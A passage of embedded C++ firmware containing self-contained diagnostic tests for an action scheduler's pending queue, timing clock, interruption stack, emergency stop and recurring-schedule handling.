  ActionInstance invalid = {};
  passed = passed && !initializeScheduledActionInstance(
      allAction, 4000, 4000, invalid);

  if (passed) {
    Serial.println("[Scheduler] Stage 8J scheduled Action instance initialization test PASSED.");
    sendSimpleResponse("SCHED_INSTANCE_INIT_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8J scheduled Action instance initialization test FAILED.");
    sendSimpleResponse("SCHED_INSTANCE_INIT_TEST:FAILED");
  }
}

// Stage 8K: verify due instances are queued in chronological order, ties
// are deterministic, duplicates are rejected, and expired fixed deadlines drop.
void testPendingScheduledActionQueue() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0 ||
      pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_PENDING_QUEUE_TEST:BUSY");
    return;
  }

  const uint32_t originalNextId = nextActionInstanceId;
  ActionInstance later = {};
  later.instanceId = 8103;
  later.scheduleId = 3;
  later.state = ACTION_INSTANCE_PENDING;
  later.dueAtUtc = 1100;
  later.durationMode = SCHEDULE_ACTIVE_DURATION;

  ActionInstance tieHigherId = later;
  tieHigherId.instanceId = 8102;
  tieHigherId.scheduleId = 2;
  tieHigherId.dueAtUtc = 1000;

  ActionInstance tieLowerId = tieHigherId;
  tieLowerId.instanceId = 8101;
  tieLowerId.scheduleId = 1;

  ActionInstance expired = {};
  expired.instanceId = 8104;
  expired.scheduleId = 4;
  expired.state = ACTION_INSTANCE_PENDING;
  expired.dueAtUtc = 900;
  expired.durationMode = SCHEDULE_FIXED_END_TIME;
  expired.fixedEndAtUtc = 1100;

  bool passed = enqueuePendingScheduledAction(later) &&
      enqueuePendingScheduledAction(tieHigherId) &&
      enqueuePendingScheduledAction(tieLowerId) &&
      enqueuePendingScheduledAction(expired);
  passed = passed && !enqueuePendingScheduledAction(tieLowerId) &&
      pendingScheduledActionCount == 4;

  ActionInstance next = {};
  // A future occurrence must remain queued until its due time.
  passed = passed && !takeNextPendingScheduledAction(800, next) &&
      pendingScheduledActionCount == 4;
  // Expired earliest item is discarded; ties are ordered by schedule ID.
  passed = passed && takeNextPendingScheduledAction(1200, next) &&
      next.scheduleId == 1 && next.dueAtUtc == 1000;
  passed = passed && takeNextPendingScheduledAction(1200, next) &&
      next.scheduleId == 2 && next.dueAtUtc == 1000;
  passed = passed && takeNextPendingScheduledAction(1200, next) &&
      next.scheduleId == 3 && next.dueAtUtc == 1100;
  passed = passed && !takeNextPendingScheduledAction(1200, next) &&
      pendingScheduledActionCount == 0;

  clearPendingScheduledActions();
  nextActionInstanceId = originalNextId;
  if (passed) {
    Serial.println("[Scheduler] Stage 8K pending scheduled-action queue test PASSED.");
    sendSimpleResponse("SCHED_PENDING_QUEUE_TEST:OK");
  } else {
    clearPendingScheduledActions();
    Serial.println("[Scheduler] Stage 8K pending scheduled-action queue test FAILED.");
    sendSimpleResponse("SCHED_PENDING_QUEUE_TEST:FAILED");
  }
}

// Stage 8L: verify one-time due detection, duplicate prevention, future
// schedule handling, and expired Fixed End Time rejection.
void testDueOneTimeScheduleDetection() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0 ||
      pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_DUE_DETECTION_TEST:BUSY");
    return;
  }

  const SchedulerStorage originalStorage = schedulerData;
  const uint32_t originalNextId = nextActionInstanceId;
  bool passed = true;
  memset(&schedulerData, 0, sizeof(schedulerData));
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  schedulerData.nextId = 4;
  schedulerData.count = 3;

  ScheduleRecord& due = schedulerData.records[0];
  due.id = 1;
  due.scheduleType = SCHEDULE_ONE_TIME;
  due.actionType = SCHEDULE_ACTION_ALL;
  due.startAtUtc = 1000;
  due.durationMode = SCHEDULE_ACTIVE_DURATION;
  due.totalDurationSeconds = 60;
  due.enabled = true;

  ScheduleRecord& future = schedulerData.records[1];
  future.id = 2;
  future.scheduleType = SCHEDULE_ONE_TIME;
  future.actionType = SCHEDULE_ACTION_ALL;
  future.startAtUtc = 1200;
  future.durationMode = SCHEDULE_ACTIVE_DURATION;
  future.totalDurationSeconds = 60;
  future.enabled = true;

  ScheduleRecord& expired = schedulerData.records[2];
  expired.id = 3;
  expired.scheduleType = SCHEDULE_ONE_TIME;
  expired.actionType = SCHEDULE_ACTION_ALL;
  expired.startAtUtc = 900;
  expired.durationMode = SCHEDULE_FIXED_END_TIME;
  expired.fixedEndAtUtc = 1100;
  expired.enabled = true;

  clearPendingScheduledActions();
  nextActionInstanceId = 1;
  passed = collectDueOneTimeSchedules(1150) == 1 &&
      pendingScheduledActionCount == 1 &&
      pendingScheduledActions[0].scheduleId == 1 &&
      pendingScheduledActions[0].dueAtUtc == 1000;

  // Polling again must not enqueue the same schedule occurrence twice.
  passed = passed && collectDueOneTimeSchedules(1150) == 0 &&
      pendingScheduledActionCount == 1;

  // The future schedule becomes due only when its UTC start is reached.
  passed = passed && collectDueOneTimeSchedules(1200) == 1 &&
      pendingScheduledActionCount == 2 &&
      pendingScheduledActions[1].scheduleId == 2;

  clearPendingScheduledActions();
  schedulerData = originalStorage;
  nextActionInstanceId = originalNextId;

  if (passed) {
    Serial.println("[Scheduler] Stage 8L due one-time schedule detection test PASSED.");
    sendSimpleResponse("SCHED_DUE_DETECTION_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8L due one-time schedule detection test FAILED.");
    sendSimpleResponse("SCHED_DUE_DETECTION_TEST:FAILED");
  }
}

// Stage 8I: verify the live runtime clock's pause and deadline behavior.
void testActionInstanceRuntimeClock() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0) {
    sendSimpleResponse("SCHED_ACTION_CLOCK_TEST:BUSY");
    return;
  }

  ActionInstance active = {};
  active.state = ACTION_INSTANCE_RUNNING;
  active.timingConfigured = true;
  active.lastTimingUpdateMs = 1000;
  ActionTimingState activeTiming = {};
  activeTiming.durationMode = SCHEDULE_ACTIVE_DURATION;
  activeTiming.phase = ACTION_TIMING_ACTIVE;
  activeTiming.remainingTotalActiveSeconds = 5;
  activeTiming.executionDurationSeconds = 2;
  activeTiming.remainingExecutionSeconds = 2;
  activeTiming.pauseIntervalSeconds = 1;
  saveActionTimingToInstance(activeTiming, active);
  active.timingConfigured = true;
  active.lastTimingUpdateMs = 1000;

  bool passed = !tickActionInstanceClock(active, 3000, 0, false) &&
      active.remainingTotalActiveSeconds == 3 &&
      active.timingPhase == ACTION_TIMING_PAUSE &&
      active.remainingPauseSeconds == 1;

  passed = passed && !tickActionInstanceClock(active, 4000, 0, false) &&
      active.timingPhase == ACTION_TIMING_ACTIVE &&
      active.remainingExecutionSeconds == 2;

  // A user pause must not consume Active Duration.
  passed = passed && !tickActionInstanceClock(active, 7000, 0, true) &&
      active.remainingTotalActiveSeconds == 3 &&
      active.remainingExecutionSeconds == 2;

  passed = passed && !tickActionInstanceClock(active, 8000, 0, false) &&
      active.remainingTotalActiveSeconds == 2 &&
      active.remainingExecutionSeconds == 1;

  ActionInstance fixed = {};
  fixed.state = ACTION_INSTANCE_PAUSED;
  fixed.timingConfigured = true;
  fixed.lastTimingUpdateMs = 1000;
  ActionTimingState fixedTiming = {};
  fixedTiming.durationMode = SCHEDULE_FIXED_END_TIME;
  fixedTiming.phase = ACTION_TIMING_PAUSE;
  fixedTiming.remainingPauseSeconds = 300;
  fixedTiming.fixedEndAtUtc = 5000;
  saveActionTimingToInstance(fixedTiming, fixed);
  fixed.timingConfigured = true;
  fixed.lastTimingUpdateMs = 1000;
  passed = passed && tickActionInstanceClock(fixed, 2000, 5000, true) &&
      fixed.timingPhase == ACTION_TIMING_FINISHED &&
      fixed.state == ACTION_INSTANCE_EMPTY;

  if (passed) {
    Serial.println("[Scheduler] Stage 8I live Action timing clock test PASSED.");
    sendSimpleResponse("SCHED_ACTION_CLOCK_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8I live Action timing clock test FAILED.");
    sendSimpleResponse("SCHED_ACTION_CLOCK_TEST:FAILED");
  }
}

// Verify that advancing an ActionInstance updates its stored timing fields,
// including execution/pause transitions and Fixed End Time expiration.
void testActionInstanceTimingAdvance() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0) {
    sendSimpleResponse("SCHED_INSTANCE_TIMING_ADVANCE_TEST:BUSY");
    return;
  }

  ActionInstance instance = {};
  instance.instanceId = 9002;
  instance.scheduleId = 8;
  instance.state = ACTION_INSTANCE_RUNNING;

  ActionTimingState initial = {};
  initial.durationMode = SCHEDULE_ACTIVE_DURATION;
  initial.phase = ACTION_TIMING_ACTIVE;
  initial.remainingTotalActiveSeconds = 5;
  initial.executionDurationSeconds = 2;
  initial.remainingExecutionSeconds = 2;
  initial.pauseIntervalSeconds = 1;
  saveActionTimingToInstance(initial, instance);

  bool passed = !advanceActionInstanceTiming(instance, 2, 2002) &&
      instance.timingPhase == ACTION_TIMING_PAUSE &&
      instance.remainingTotalActiveSeconds == 3 &&
      instance.remainingPauseSeconds == 1;

  passed = passed && !advanceActionInstanceTiming(instance, 1, 2003) &&
      instance.timingPhase == ACTION_TIMING_ACTIVE &&
      instance.remainingExecutionSeconds == 2;

  passed = passed && !advanceActionInstanceTiming(instance, 2, 2005) &&
      instance.timingPhase == ACTION_TIMING_PAUSE &&
      instance.remainingTotalActiveSeconds == 1;

  passed = passed && !advanceActionInstanceTiming(instance, 1, 2006) &&
      instance.timingPhase == ACTION_TIMING_ACTIVE;

  passed = passed && advanceActionInstanceTiming(instance, 1, 2007) &&
      instance.timingPhase == ACTION_TIMING_FINISHED &&
      instance.state == ACTION_INSTANCE_EMPTY;

  ActionInstance fixed = {};
  fixed.instanceId = 9003;
  fixed.state = ACTION_INSTANCE_PAUSED;
  ActionTimingState fixedTiming = {};
  fixedTiming.durationMode = SCHEDULE_FIXED_END_TIME;
  fixedTiming.phase = ACTION_TIMING_PAUSE;
  fixedTiming.remainingPauseSeconds = 300;
  fixedTiming.fixedEndAtUtc = 3000;
  saveActionTimingToInstance(fixedTiming, fixed);

  passed = passed && advanceActionInstanceTiming(fixed, 0, 3000) &&
      fixed.timingPhase == ACTION_TIMING_FINISHED &&
      fixed.state == ACTION_INSTANCE_EMPTY;

  if (passed) {
    Serial.println("[Scheduler] Stage 8H Action instance timing advance test PASSED.");
    sendSimpleResponse("SCHED_INSTANCE_TIMING_ADVANCE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8H Action instance timing advance test FAILED.");
    sendSimpleResponse("SCHED_INSTANCE_TIMING_ADVANCE_TEST:FAILED");
  }
}


// Verify that an Action's timing values survive pause/stack/restore unchanged.
void testActionInstanceTimingSnapshot() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0) {
    sendSimpleResponse("SCHED_INSTANCE_TIMING_TEST:BUSY");
    return;
  }

  ActionTimingState original = {};
  original.durationMode = SCHEDULE_ACTIVE_DURATION;
  original.phase = ACTION_TIMING_PAUSE;
  original.remainingTotalActiveSeconds = 427;
  original.executionDurationSeconds = 60;
  original.remainingExecutionSeconds = 18;
  original.pauseIntervalSeconds = 25;
  original.remainingPauseSeconds = 11;
  original.fixedEndAtUtc = 0;

  ActionInstance paused = {};
  paused.instanceId = 9001;
  paused.scheduleId = 7;
  paused.state = ACTION_INSTANCE_PAUSED;
  saveActionTimingToInstance(original, paused);

  ActionInstance popped = {};
  bool stackPassed = pushInterruptedAction(paused) &&
                     popInterruptedAction(popped);

  ActionTimingState restored = {};
  restoreActionTimingFromInstance(popped, restored);

  const bool passed = stackPassed &&
      popped.instanceId == paused.instanceId &&
      popped.state == ACTION_INSTANCE_PAUSED &&
      restored.durationMode == original.durationMode &&
      restored.phase == original.phase &&
      restored.remainingTotalActiveSeconds == original.remainingTotalActiveSeconds &&
      restored.executionDurationSeconds == original.executionDurationSeconds &&
      restored.remainingExecutionSeconds == original.remainingExecutionSeconds &&
      restored.pauseIntervalSeconds == original.pauseIntervalSeconds &&
      restored.remainingPauseSeconds == original.remainingPauseSeconds &&
      restored.fixedEndAtUtc == original.fixedEndAtUtc;

  if (passed) {
    Serial.println("[Scheduler] Stage 8G Action timing snapshot test PASSED.");
    sendSimpleResponse("SCHED_INSTANCE_TIMING_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8G Action timing snapshot test FAILED.");
    sendSimpleResponse("SCHED_INSTANCE_TIMING_TEST:FAILED");
  }
}


void testActionInstanceRemoval() {
  ActionInstance saved[3] = {};
  ActionInstance restored = {};

  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0) {
    sendSimpleResponse("SCHED_INSTANCE_REMOVE_TEST:BUSY");
    return;
  }

  bool passed = true;
  for (uint8_t i = 0; i < 3; ++i) {
    saved[i].instanceId = nextActionInstanceId++;
    saved[i].scheduleId = (uint16_t)(i + 1);
    saved[i].state = ACTION_INSTANCE_PAUSED;
    snprintf(saved[i].command, sizeof(saved[i].command),
             "REMOVE_TEST_%u", (unsigned)(i + 1));
    if (!pushInterruptedAction(saved[i])) passed = false;
  }

  // Remove the middle item (B). The remaining stack must still be A then C.
  if (!removeInterruptedActionById(saved[1].instanceId)) passed = false;
  if (interruptedActionCount != 2) passed = false;
  if (removeInterruptedActionById(0xFFFFFFFFu)) passed = false;

  if (!popInterruptedAction(restored) ||
      restored.instanceId != saved[2].instanceId) passed = false;
  if (!popInterruptedAction(restored) ||
      restored.instanceId != saved[0].instanceId) passed = false;
  if (interruptedActionCount != 0) passed = false;

  if (passed) {
    Serial.println("[Scheduler] Action-instance removal test PASSED.");
    sendSimpleResponse("SCHED_INSTANCE_REMOVE_TEST:OK");
  } else {
    // Ensure a failed diagnostic never leaves test instances behind.
    interruptedActionCount = 0;
    memset(interruptedActionStack, 0, sizeof(interruptedActionStack));
    Serial.println("[Scheduler] Action-instance removal test FAILED.");
    sendSimpleResponse("SCHED_INSTANCE_REMOVE_TEST:FAILED");
  }
}

void testActionInstanceStack() {
  ActionInstance saved[MAX_ACTION_INSTANCES] = {};
  ActionInstance restored = {};
  const uint8_t originalCount = interruptedActionCount;
  const uint32_t originalNextId = nextActionInstanceId;

  // Keep the diagnostic isolated from any real stack entries.
  if (actionActive || actionTaskHandle != nullptr || originalCount != 0) {
    sendSimpleResponse("SCHED_INSTANCE_TEST:BUSY");
    return;
  }

  bool passed = true;
  for (uint8_t i = 0; i < 3; ++i) {
    saved[i].instanceId = nextActionInstanceId++;
    saved[i].scheduleId = (uint16_t)(i + 1);
    saved[i].actionType = (i == 1)
        ? SCHEDULE_ACTION_INDIVIDUAL : SCHEDULE_ACTION_ALL;
    snprintf(saved[i].command, sizeof(saved[i].command),
             "TEST_INSTANCE_%u", (unsigned)(i + 1));
    saved[i].state = ACTION_INSTANCE_RUNNING;
    saved[i].remainingTotalActiveSeconds = 900 - (i * 100);
    saved[i].remainingExecutionSeconds = 60 - (i * 10);
    saved[i].remainingPauseSeconds = 15 + (i * 5);
    saved[i].cycleNumber = i + 4;
    saved[i].fixedEndAtUtc = 1900000000 + (i * 60);
    saved[i].dueAtUtc = 1800000000 + (i * 60);
    if (!pushInterruptedAction(saved[i])) passed = false;
  }

  if (interruptedActionCount != 3) passed = false;
  for (int8_t i = 2; i >= 0; --i) {
    if (!popInterruptedAction(restored)) {
      passed = false;
      break;
    }
    if (restored.instanceId != saved[i].instanceId ||
        restored.scheduleId != saved[i].scheduleId ||
        restored.actionType != saved[i].actionType ||
        strcmp(restored.command, saved[i].command) != 0 ||
        restored.state != ACTION_INSTANCE_PAUSED ||
        restored.remainingTotalActiveSeconds != saved[i].remainingTotalActiveSeconds ||
        restored.remainingExecutionSeconds != saved[i].remainingExecutionSeconds ||
        restored.remainingPauseSeconds != saved[i].remainingPauseSeconds ||
        restored.cycleNumber != saved[i].cycleNumber ||
        restored.fixedEndAtUtc != saved[i].fixedEndAtUtc ||
        restored.dueAtUtc != saved[i].dueAtUtc) {
      passed = false;
    }
  }

  interruptedActionCount = originalCount;
  nextActionInstanceId = originalNextId;
  if (passed) {
    Serial.println("[Scheduler] Action-instance LIFO stack test PASSED.");
    sendSimpleResponse("SCHED_INSTANCE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Action-instance LIFO stack test FAILED.");
    sendSimpleResponse("SCHED_INSTANCE_TEST:FAILED");
  }
}

// Stage 8O diagnostic: start a long scheduled Action, queue a short higher
// priority occurrence, and verify the first instance is preserved on the LIFO
// interruption stack while the queued instance takes over the runner.
void testScheduledInterruptionHandoff() {
  if (!timeSynced || time(nullptr) <= 0) {
    sendSimpleResponse("SCHED_INTERRUPTION_HANDOFF_TEST:TIME_NOT_SET");
    return;
  }
  if (actionActive || actionTaskHandle != nullptr ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_INTERRUPTION_HANDOFF_TEST:BUSY");
    return;
  }

  ActionInstance first = {};
  first.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  first.scheduleId = 65528;
  first.actionType = SCHEDULE_ACTION_ALL;
  first.state = ACTION_INSTANCE_PENDING;
  first.dueAtUtc = static_cast<uint32_t>(time(nullptr));
  first.durationMode = SCHEDULE_ACTIVE_DURATION;
  first.remainingTotalActiveSeconds = 30;
  first.timingPhase = ACTION_TIMING_ACTIVE;
  first.timingConfigured = true;
  strncpy(first.command, "ACTION_ALL", sizeof(first.command) - 1);

  if (!startScheduledActionTask(first)) {
    sendSimpleResponse("SCHED_INTERRUPTION_HANDOFF_TEST:FAILED");
    return;
  }

  ActionInstance second = {};
  second.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  second.scheduleId = 65527;
  second.actionType = SCHEDULE_ACTION_ALL;
  second.state = ACTION_INSTANCE_PENDING;
  second.dueAtUtc = static_cast<uint32_t>(time(nullptr));
  second.durationMode = SCHEDULE_ACTIVE_DURATION;
  second.remainingTotalActiveSeconds = 2;
  second.timingPhase = ACTION_TIMING_ACTIVE;
  second.timingConfigured = true;
  strncpy(second.command, "ACTION_ALL", sizeof(second.command) - 1);

  if (!enqueuePendingScheduledAction(second)) {
    txAbortRequested = true;
    sendSimpleResponse("SCHED_INTERRUPTION_HANDOFF_TEST:FAILED");
    return;
  }

  Serial.println("[Scheduler] Stage 8O handoff test queued a second Action; expect the first to be paused and the second to run.");
  sendSimpleResponse("SCHED_INTERRUPTION_HANDOFF_TEST:STARTED");
}

// Stage 8P diagnostic: a short scheduled Action interrupts a longer one.
// After the short Action completes, the original instance should resume with
// its remaining timing state rather than restarting from its initial values.
void testScheduledInterruptionResume() {
  if (!timeSynced || time(nullptr) <= 0) {
    sendSimpleResponse("SCHED_INTERRUPTION_RESUME_TEST:TIME_NOT_SET");
    return;
  }
  if (actionActive || actionTaskHandle != nullptr ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_INTERRUPTION_RESUME_TEST:BUSY");
    return;
  }

  ActionInstance first = {};
  first.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  first.scheduleId = 65526;
  first.actionType = SCHEDULE_ACTION_ALL;
  first.state = ACTION_INSTANCE_PENDING;
  first.dueAtUtc = static_cast<uint32_t>(time(nullptr));
  first.durationMode = SCHEDULE_ACTIVE_DURATION;
  first.remainingTotalActiveSeconds = 10;
  first.timingPhase = ACTION_TIMING_ACTIVE;
  first.timingConfigured = true;
  strncpy(first.command, "ACTION_ALL", sizeof(first.command) - 1);

  if (!startScheduledActionTask(first)) {
    sendSimpleResponse("SCHED_INTERRUPTION_RESUME_TEST:FAILED");
    return;
  }

  ActionInstance second = {};
  second.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  second.scheduleId = 65525;
  second.actionType = SCHEDULE_ACTION_ALL;
  second.state = ACTION_INSTANCE_PENDING;
  second.dueAtUtc = static_cast<uint32_t>(time(nullptr));
  second.durationMode = SCHEDULE_ACTIVE_DURATION;
  second.remainingTotalActiveSeconds = 2;
  second.timingPhase = ACTION_TIMING_ACTIVE;
  second.timingConfigured = true;
  strncpy(second.command, "ACTION_ALL", sizeof(second.command) - 1);

  if (!enqueuePendingScheduledAction(second)) {
    txAbortRequested = true;
    sendSimpleResponse("SCHED_INTERRUPTION_RESUME_TEST:FAILED");
    return;
  }

  Serial.println("[Scheduler] Stage 8P resume test started; expect the second Action to finish after about 2 seconds, then the first Action to resume.");
  sendSimpleResponse("SCHED_INTERRUPTION_RESUME_TEST:STARTED");
}

// Stage 8R diagnostic: prove that clearing live/queued Action instances does
// not modify the saved schedule configuration table.
void testEmergencyStopAllStoragePreservation() {
  if (actionActive || actionTaskHandle != nullptr) {
    sendSimpleResponse("SCHED_EMERGENCY_STOP_TEST:BUSY");
    return;
  }

  const SchedulerStorage savedSchedules = schedulerData;
  ActionInstance savedStack[MAX_ACTION_INSTANCES];
  ActionInstance savedPending[MAX_PENDING_SCHEDULED_ACTIONS];
  memcpy(savedStack, interruptedActionStack, sizeof(savedStack));
  memcpy(savedPending, pendingScheduledActions, sizeof(savedPending));
  const uint8_t originalStackCount = interruptedActionCount;
  const uint8_t originalPendingCount = pendingScheduledActionCount;

  clearAllActionInstances();

  bool passed = interruptedActionCount == 0 &&
      pendingScheduledActionCount == 0 &&
      memcmp(&savedSchedules, &schedulerData, sizeof(SchedulerStorage)) == 0;

  // Restore the pre-test live queues so this diagnostic is non-destructive.
  // The test only runs while no Action is executing.
  memcpy(interruptedActionStack, savedStack, sizeof(savedStack));
  memcpy(pendingScheduledActions, savedPending, sizeof(savedPending));
  interruptedActionCount = originalStackCount;
  pendingScheduledActionCount = originalPendingCount;
  passed = passed && interruptedActionCount == originalStackCount &&
      pendingScheduledActionCount == originalPendingCount &&
      memcmp(interruptedActionStack, savedStack, sizeof(savedStack)) == 0 &&
      memcmp(pendingScheduledActions, savedPending, sizeof(savedPending)) == 0;

  if (passed) {
    Serial.println("[Scheduler] Stage 8R Emergency Stop All storage-preservation test PASSED.");
    sendSimpleResponse("SCHED_EMERGENCY_STOP_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8R Emergency Stop All storage-preservation test FAILED.");
    sendSimpleResponse("SCHED_EMERGENCY_STOP_TEST:FAILED");
  }
}

// Stage 8W: end-to-end recurring due detection. This validates that a real
// recurring schedule is placed in the pending queue, its local Fixed End Time
// is resolved across the active timezone rule, and repeat polling is deduped.
void testRecurringDueQueueIntegration() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0 ||
      pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_RECURRING_QUEUE_TEST:BUSY");
    return;
  }

  const SchedulerStorage originalSchedulerData = schedulerData;
  const RecurringRunStorage originalRecurringRunData = recurringRunData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const String originalTimezoneRule = schedulerPreferences.getString("tzrule", "");
  const char* testTimezoneRule = "EST5EDT,M3.2.0/2,M11.1.0/2";
  bool passed = applyPosixTimezoneRule(testTimezoneRule) &&
      schedulerPreferences.putString("tzrule", testTimezoneRule) > 0;

  memset(&schedulerData, 0, sizeof(schedulerData));
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  schedulerData.nextId = 22;
  schedulerData.count = 1;

  ScheduleRecord& recurring = schedulerData.records[0];
  recurring.id = 21;
  recurring.scheduleType = SCHEDULE_RECURRING;
  recurring.actionType = SCHEDULE_ACTION_ALL;
  recurring.startYear = 2026;
  recurring.startMonth = 11;
  recurring.startDay = 2; // Monday, after the 2026 US DST fall-back.
  recurring.startHour = 9;
  recurring.startMinute = 0;
  recurring.weekdays = static_cast<uint8_t>(1U << 1); // Monday.
  recurring.startAtUtc = 1793628000UL; // 2026-11-02 09:00 EST.
  recurring.durationMode = SCHEDULE_FIXED_END_TIME;
  recurring.fixedEndDayOffset = 0;
  recurring.fixedEndHour = 10;
  recurring.fixedEndMinute = 0;
  recurring.executionDurationSeconds = 60;
  recurring.pauseIntervalSeconds = 30;
  recurring.enabled = true;

  memset(&recurringRunData, 0, sizeof(recurringRunData));
  recurringRunData.version = RECUR_RUN_STORAGE_VERSION;
  clearPendingScheduledActions();
  nextActionInstanceId = 1;

  // 2026-11-16 09:05 EST. The due occurrence should be 09:00 EST,
  // with a 10:00 EST Fixed End Time (15:00 UTC).
  const uint32_t simulatedNowUtc = 1794837900UL;
  const uint32_t expectedDueUtc = 1794837600UL;
  const uint32_t expectedEndUtc = 1794841200UL;

  passed = passed && collectDueRecurringSchedules(simulatedNowUtc) == 1 &&
      pendingScheduledActionCount == 1 &&
      pendingScheduledActions[0].scheduleId == 21 &&
      pendingScheduledActions[0].dueAtUtc == expectedDueUtc &&
      pendingScheduledActions[0].fixedEndAtUtc == expectedEndUtc &&
      lastQueuedRecurringOccurrence(21) == expectedDueUtc;

  // A second scheduler poll at the same instant must not queue a duplicate.
  passed = passed && collectDueRecurringSchedules(simulatedNowUtc) == 0 &&
      pendingScheduledActionCount == 1;

  clearPendingScheduledActions();
  schedulerData = originalSchedulerData;
  recurringRunData = originalRecurringRunData;
  saveRecurringRunStorage();
  nextActionInstanceId = originalNextInstanceId;
  if (originalTimezoneRule.isEmpty()) {
    schedulerPreferences.remove("tzrule");
    unsetenv("TZ");
    tzset();
  } else {
    schedulerPreferences.putString("tzrule", originalTimezoneRule.c_str());
    applyPosixTimezoneRule(originalTimezoneRule.c_str());
  }

  if (passed) {
    Serial.println("[Scheduler] Stage 8W recurring due-queue integration test PASSED.");
    sendSimpleResponse("SCHED_RECURRING_QUEUE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8W recurring due-queue integration test FAILED.");
    sendSimpleResponse("SCHED_RECURRING_QUEUE_TEST:FAILED");
  }
}

// Stage 8X: exercise the same due-collection path used by the live poll.
// This verifies one-time and recurring schedules enter the queue together,
// recurring schedules are independent, and repeated polls do not duplicate.
void testAutomaticRecurringPollIntegration() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0 ||
      pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_AUTO_POLL_TEST:BUSY");
    return;
  }

  const SchedulerStorage originalSchedulerData = schedulerData;
  const RecurringRunStorage originalRecurringRunData = recurringRunData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const String originalTimezoneRule = schedulerPreferences.getString("tzrule", "");
  const char* testTimezoneRule = "EST5EDT,M3.2.0/2,M11.1.0/2";
  bool passed = applyPosixTimezoneRule(testTimezoneRule) &&
      schedulerPreferences.putString("tzrule", testTimezoneRule) > 0;

  memset(&schedulerData, 0, sizeof(schedulerData));
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  schedulerData.nextId = 33;
  schedulerData.count = 3;

  ScheduleRecord& oneTime = schedulerData.records[0];
  oneTime.id = 30;
  oneTime.scheduleType = SCHEDULE_ONE_TIME;
  oneTime.actionType = SCHEDULE_ACTION_ALL;
  oneTime.startAtUtc = 1794837600UL;
  oneTime.durationMode = SCHEDULE_ACTIVE_DURATION;
  oneTime.totalDurationSeconds = 600;
  oneTime.executionDurationSeconds = 60;
  oneTime.pauseIntervalSeconds = 30;
  oneTime.enabled = true;

  for (uint8_t i = 1; i < 3; ++i) {
    ScheduleRecord& recurring = schedulerData.records[i];
    recurring.id = static_cast<uint16_t>(30 + i);
    recurring.scheduleType = SCHEDULE_RECURRING;
    recurring.actionType = SCHEDULE_ACTION_ALL;
    recurring.startYear = 2026;
    recurring.startMonth = 11;
    recurring.startDay = 2; // Monday anchor, after the 2026 US DST fall-back.
    recurring.startHour = 9;
    recurring.startMinute = 0;
    recurring.weekdays = static_cast<uint8_t>(1U << 1);
    recurring.startAtUtc = 1793628000UL;
    recurring.durationMode = SCHEDULE_ACTIVE_DURATION;
    recurring.totalDurationSeconds = 600;
    recurring.executionDurationSeconds = 60;
    recurring.pauseIntervalSeconds = 30;
    recurring.enabled = true;
  }

  memset(&recurringRunData, 0, sizeof(recurringRunData));
  recurringRunData.version = RECUR_RUN_STORAGE_VERSION;
  passed = passed && saveRecurringRunStorage();
  clearPendingScheduledActions();
  nextActionInstanceId = 1;

  const uint32_t simulatedNowUtc = 1794837900UL;
  const uint32_t expectedDueUtc = 1794837600UL;
  passed = passed && collectDueSchedulesForPoll(simulatedNowUtc) == 3 &&
      pendingScheduledActionCount == 3;

  // All three occurrences share the same due instant; schedule ID breaks ties.
  passed = passed && pendingScheduledActions[0].scheduleId == 30 &&
      pendingScheduledActions[1].scheduleId == 31 &&
      pendingScheduledActions[2].scheduleId == 32 &&
      pendingScheduledActions[0].dueAtUtc == expectedDueUtc &&
      pendingScheduledActions[1].dueAtUtc == expectedDueUtc &&
      pendingScheduledActions[2].dueAtUtc == expectedDueUtc;

  // The live poll calls this same function every 5 ms. Repeated polling must
  // not add duplicates for either one-time or recurring schedule occurrences.
  passed = passed && collectDueSchedulesForPoll(simulatedNowUtc) == 0 &&
      pendingScheduledActionCount == 3;

  clearPendingScheduledActions();
  schedulerData = originalSchedulerData;
  recurringRunData = originalRecurringRunData;
  const bool historyRestored = saveRecurringRunStorage();
  nextActionInstanceId = originalNextInstanceId;
  if (originalTimezoneRule.isEmpty()) {
    schedulerPreferences.remove("tzrule");
    unsetenv("TZ");
    tzset();
  } else {
    schedulerPreferences.putString("tzrule", originalTimezoneRule.c_str());
    applyPosixTimezoneRule(originalTimezoneRule.c_str());
  }
  passed = passed && historyRestored;

  if (passed) {
    Serial.println("[Scheduler] Stage 8X automatic recurring poll integration test PASSED.");
    sendSimpleResponse("SCHED_AUTO_POLL_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8X automatic recurring poll integration test FAILED.");
    sendSimpleResponse("SCHED_AUTO_POLL_TEST:FAILED");
  }
}

